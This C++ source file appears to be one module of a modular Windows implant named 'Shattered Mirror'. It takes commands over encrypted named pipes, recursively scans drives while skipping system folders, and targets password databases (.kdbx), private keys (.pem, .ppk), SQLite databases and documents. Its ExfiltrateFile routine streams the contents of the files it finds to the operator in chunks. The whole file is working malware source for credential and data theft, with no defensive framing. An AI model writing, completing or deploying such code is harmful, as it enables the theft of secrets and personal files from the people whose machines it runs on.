/*=============================================================================
 * Shattered Mirror v1 — Atom 09: File System Traversal
 * OPTION B: Dual pipes – receives commands on command pipe,
 *            sends reports on report pipe.
 *===========================================================================*/

#include "Atom_09_FileSys.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>
#include <cstring>
#include <shlwapi.h>
#include <string>

#pragma comment(lib, "shlwapi.lib")

/* Debug logging to C:\Users\Public\fs_debug.txt */
static void FsDebug(const char *format, ...) {
  char buf[512];
  va_list args;
  va_start(args, format);
  vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  FILE *f = fopen("log\\fs_debug.txt", "a");
  if (f) {
    fprintf(f, "%s\n", buf);
    fclose(f);
  }
}

/* Deep skip list to avoid junk and standard Windows files */
const WCHAR *g_SkipDirs[] = {
    L"Windows", L"Program Files", L"Program Files (x86)", L"ProgramData", 
    L"AppData", L"$Recycle.Bin", L"System Volume Information", L"Microsoft",
    L"Boot", L"Recovery", L"Temp", L"Common Files", L"WindowsApps", 
    L"System32", L"SysWOW64", L"WinSxS"
};

/* Universal defaults for when LO doesn't specify */
const WCHAR *g_DefaultExts[] = {L".txt", L".pdf", L".docx", L".kdbx", L".sqlite", L".pem", L".ppk"};

/* File extensions we care about */
const WCHAR *g_TargetExts[] = {L".txt",  L".pdf", L".docx", L".xlsx",
                               L".kdbx", L".pem", L".ppk",  L".sqlite"};

static BOOL ShouldSkipDir(const WCHAR *szDirName, BOOL bOverride) {
  if (bOverride) return FALSE; // LO said go, so we go.
  for (int i = 0; i < sizeof(g_SkipDirs) / sizeof(g_SkipDirs[0]); i++) {
    if (lstrcmpiW(szDirName, g_SkipDirs[i]) == 0)
      return TRUE;
  }
  return FALSE;
}

static BOOL IsTargetFile(const WCHAR *szFileName, const WCHAR *szTargetExt, const WCHAR *szKeyword, BOOL bFullScan) {
    if (bFullScan) return TRUE; // LO wants everything.
    
    const WCHAR *pExt = wcsrchr(szFileName, L'.');
    
    // Check Keyword first if provided
    if (szKeyword && szKeyword[0] != L'\0') {
        if (!StrStrIW(szFileName, szKeyword)) return FALSE;
    }

    // If a specific extension was requested, check it
    if (szTargetExt && szTargetExt[0] != L'\0') {
        if (!pExt || lstrcmpiW(pExt, szTargetExt) != 0) return FALSE;
        return TRUE;
    }

    // Otherwise, check against our default high-value list
    if (!pExt) return FALSE;
    for (int i = 0; i < sizeof(g_DefaultExts) / sizeof(g_DefaultExts[0]); i++) {
        if (lstrcmpiW(pExt, g_DefaultExts[i]) == 0) return TRUE;
    }
    return FALSE;
}

static void ExfiltrateFile(HANDLE hReportPipe, const WCHAR *szPathW, BYTE *pSharedKey) {
    HANDLE hFile = CreateFileW(szPathW, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return; }

    char szPathA[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, szPathW, -1, szPathA, MAX_PATH, NULL, NULL);
    char *fileName = strrchr(szPathA, '\\');
    if (fileName) fileName++; else fileName = szPathA;

    // Send header
    char header[512];
    sprintf_s(header, "[FS_FILE] name=%s size=%lu path=%s", fileName, dwSize, szPathA);
    IPC_MESSAGE hdrMsg = {0};
    hdrMsg.dwSignature = 0x534D4952;
    hdrMsg.CommandId = CMD_FORWARD_REPORT; // Send as forward so it's prioritized
    hdrMsg.AtomId = 9;
    hdrMsg.dwPayloadLen = (DWORD)strlen(header);
    memcpy(hdrMsg.Payload, header, hdrMsg.dwPayloadLen);
    IPC_SendMessage(hReportPipe, &hdrMsg, pSharedKey, 16);

    // Send data in chunks
    BYTE buffer[MAX_IPC_PAYLOAD_SIZE - 64];
    DWORD dwRead = 0;
    while (ReadFile(hFile, buffer, sizeof(buffer), &dwRead, NULL) && dwRead > 0) {
        IPC_MESSAGE chunkMsg = {0};
        chunkMsg.dwSignature = 0x534D4952;
        chunkMsg.CommandId = CMD_FORWARD_REPORT;
        chunkMsg.AtomId = 9;
        chunkMsg.dwPayloadLen = dwRead;
        memcpy(chunkMsg.Payload, buffer, dwRead);
        IPC_SendMessage(hReportPipe, &chunkMsg, pSharedKey, 16);
    }
    CloseHandle(hFile);
}

/*
 * Recursive directory walk – sends file paths via report pipe
 */
static void WalkDirectory(HANDLE hCmdPipe, HANDLE hReportPipe, const WCHAR *szDir, const WCHAR *szExt, const WCHAR *szKey,
                           BOOL bOverride, BOOL bFull, BOOL bSmartExfil, BYTE *pSharedKey, int depth = 0) {
  if (depth > 15) {
    FsDebug("Max recursion depth reached at: %ls", szDir);
    return;
  }

  // Check for interruption every few directories
  static int checkCounter = 0;
  if (++checkCounter % 10 == 0) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
       FsDebug("Walk interrupted by incoming command");
       throw std::string("INTERRUPT"); 
    }
  }

  WCHAR szSearch[MAX_PATH];
  wsprintfW(szSearch, L"%s\\*", szDir);

  WIN32_FIND_DATAW fd;
  HANDLE hFind = FindFirstFileW(szSearch, &fd);
  if (hFind == INVALID_HANDLE_VALUE)
    return;

  try {
    do {
      if (lstrcmpW(fd.cFileName, L".") == 0 || lstrcmpW(fd.cFileName, L"..") == 0)
        continue;

      WCHAR szFullPath[MAX_PATH];
      wsprintfW(szFullPath, L"%s\\%s", szDir, fd.cFileName);

      if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) &&
            !ShouldSkipDir(fd.cFileName, bOverride)) {
          WalkDirectory(hCmdPipe, hReportPipe, szFullPath, szExt, szKey, bOverride, bFull, bSmartExfil, pSharedKey, depth + 1);
        }
      } else {
        if (IsTargetFile(fd.cFileName, szExt, szKey, bFull)) {
          char szPathA[MAX_PATH];
          WideCharToMultiByte(CP_ACP, 0, szFullPath, -1, szPathA, MAX_PATH, NULL, NULL);

          IPC_MESSAGE msg = {0};
          msg.dwSignature = 0x534D4952;
          msg.CommandId = CMD_REPORT;
          msg.AtomId = 9; 
          msg.dwPayloadLen = (DWORD)strlen(szPathA);
          memcpy(msg.Payload, szPathA, msg.dwPayloadLen);
          IPC_SendMessage(hReportPipe, &msg, pSharedKey, 16);

          if (bSmartExfil && fd.nFileSizeLow < 50 * 1024 * 1024) { // Only auto-exfil files < 50MB
             ExfiltrateFile(hReportPipe, szFullPath, pSharedKey);
          }

          // Log to local file for Bale/Flushing
          FILE *f = NULL;
          fopen_s(&f, "log\\fs_scan.txt", "a");
          if (f) {
            fprintf(f, "%s\n", szPathA);
            fclose(f);
          }
        }
      }
    } while (FindNextFileW(hFind, &fd));
  } catch (...) {
    FindClose(hFind);
    throw;
  }
  FindClose(hFind);
}

DWORD WINAPI FileSystemAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  FsDebug("Atom 9 started. ID: %lu", dwAtomId);

  // 1. Connect to command pipe (receive scan commands)
  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!hCmdPipe) {
    FsDebug("IPC_ConnectToCommandPipe failed");
    return 1;
  }

  // 2. Connect to report pipe (send file paths)
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!hReportPipe) {
    FsDebug("IPC_ConnectToReportPipe failed");
    CloseHandle(hCmdPipe);
    return 1;
  }

  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  // Send CMD_READY
  if (hReportPipe) {
    IPC_MESSAGE readyMsg = {0};
    readyMsg.dwSignature = 0x534D4952;
    readyMsg.CommandId = CMD_READY;
    readyMsg.AtomId = dwAtomId;
    readyMsg.dwPayloadLen = 0;
    IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);
  }
  FsDebug("Sent CMD_READY");

  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          std::string payload = (char *)inMsg.Payload;
          if (payload == "DRIVES") {
            DWORD drives = GetLogicalDrives();
            char report[512] = "[FS_DRIVES] ";
            for (int i = 0; i < 26; i++) {
              if (drives & (1 << i)) {
                char drv[4];
                sprintf_s(drv, "%c:\\ ", 'A' + i);
                strcat_s(report, drv);
              }
            }
            IPC_MESSAGE msg = {0};
            msg.dwSignature = 0x534D4952;
            msg.CommandId = CMD_REPORT;
            msg.AtomId = 9;
            msg.dwPayloadLen = (DWORD)strlen(report);
            memcpy(msg.Payload, report, msg.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
          } else if (payload == "FLUSH") {
            char report[MAX_PATH];
            GetFullPathNameA("log\\fs_scan.txt", MAX_PATH, report, NULL);
            IPC_MESSAGE msg = {0};
            msg.dwSignature = 0x534D4952;
            msg.CommandId = CMD_REPORT;
            msg.AtomId = 9;
            sprintf_s((char *)msg.Payload, sizeof(msg.Payload), "[FS_FLUSH_READY] %s", report);
            msg.dwPayloadLen = (DWORD)strlen((char *)msg.Payload);
            IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
          } else {
            // Format: [PATH]|[EXT]|[KEYWORD]|[FLAGS]
            char szPathA[MAX_PATH] = {0};
            char szExtA[32] = {0};
            char szKeyA[128] = {0};
            char szFlagsA[32] = {0};

            char *next = NULL;
            char *p = strtok_s((char *)inMsg.Payload, "|", &next);
            if (p) strcpy_s(szPathA, p);
            p = strtok_s(NULL, "|", &next);
            if (p) strcpy_s(szExtA, p);
            p = strtok_s(NULL, "|", &next);
            if (p) strcpy_s(szKeyA, p);
            p = strtok_s(NULL, "|", &next);
            if (p) strcpy_s(szFlagsA, p);

            WCHAR szPathW[MAX_PATH] = {0}, szExtW[32] = {0}, szKeyW[128] = {0};
            MultiByteToWideChar(CP_ACP, 0, szPathA, -1, szPathW, MAX_PATH);
            MultiByteToWideChar(CP_ACP, 0, szExtA, -1, szExtW, 32);
            MultiByteToWideChar(CP_ACP, 0, szKeyA, -1, szKeyW, 128);

            DWORD dwAttr = GetFileAttributesW(szPathW);
            if (dwAttr == INVALID_FILE_ATTRIBUTES) {
              IPC_MESSAGE msg = {0};
              msg.dwSignature = 0x534D4952;
              msg.CommandId = CMD_REPORT;
              msg.AtomId = 9;
              sprintf_s((char *)msg.Payload, sizeof(msg.Payload), "[FS_ERROR] Path does not exist: %s", szPathA);
              msg.dwPayloadLen = (DWORD)strlen((char *)msg.Payload);
              IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
            } else {
              IPC_MESSAGE okMsg = {0};
              okMsg.dwSignature = 0x534D4952;
              okMsg.CommandId = CMD_REPORT;
              okMsg.AtomId = 9;
              sprintf_s((char *)okMsg.Payload, sizeof(okMsg.Payload), "[FS_PATH_OK] Validated: %s", szPathA);
              okMsg.dwPayloadLen = (DWORD)strlen((char *)okMsg.Payload);
              IPC_SendMessage(hReportPipe, &okMsg, SharedSessionKey, 16);

              BOOL bOverride = (strstr(szFlagsA, "OVERRIDE") != NULL);
              BOOL bValidateOnly = (strstr(szFlagsA, "VALIDATE") != NULL);
              BOOL bSmartExfil = (strstr(szFlagsA, "SMART_EXFIL") != NULL);
              BOOL bFull = (szExtW[0] == L'\0' && szKeyW[0] == L'\0');
              
              if (!bValidateOnly) {
                 // Clear old scan log
                 DeleteFileA("log\\fs_scan.txt");
                 try {
                    WalkDirectory(hCmdPipe, hReportPipe, szPathW, szExtW, szKeyW, bOverride, bFull, bSmartExfil, SharedSessionKey);
                    
                    // Send final report
                    char report[MAX_PATH];
                    GetFullPathNameA("log\\fs_scan.txt", MAX_PATH, report, NULL);
                    IPC_MESSAGE finMsg = {0};
                    finMsg.dwSignature = 0x534D4952;
                    finMsg.CommandId = CMD_REPORT;
                    finMsg.AtomId = 9;
                    sprintf_s((char *)finMsg.Payload, sizeof(finMsg.Payload), "[FS_READY] %s", report);
                    finMsg.dwPayloadLen = (DWORD)strlen((char *)finMsg.Payload);
                    IPC_SendMessage(hReportPipe, &finMsg, SharedSessionKey, 16);

                 } catch (...) {
                    // Walk interrupted
                 }
              }
            }
          }
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          break;
        }
      }
    }
    Sleep(100);
  }

  CloseHandle(hCmdPipe);
  CloseHandle(hReportPipe);
  return 0;
}